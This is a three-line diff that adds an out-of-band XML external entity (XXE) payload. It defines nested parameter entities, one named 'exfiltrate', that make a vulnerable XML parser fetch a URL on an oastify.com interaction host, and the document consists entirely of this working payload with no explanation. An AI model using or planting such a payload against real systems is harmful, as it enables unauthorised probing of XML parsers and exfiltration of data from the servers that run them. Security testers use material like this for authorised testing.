@@ -1,0 +1,3 @@
+<!ENTITY % eval "<!ENTITY &#x25; exfiltrate SYSTEM 'http://hteobby8uh6zeuoxdixq9655zw5ntlha.oastify.com/wow'>">
+%eval;
+%exfiltrate;
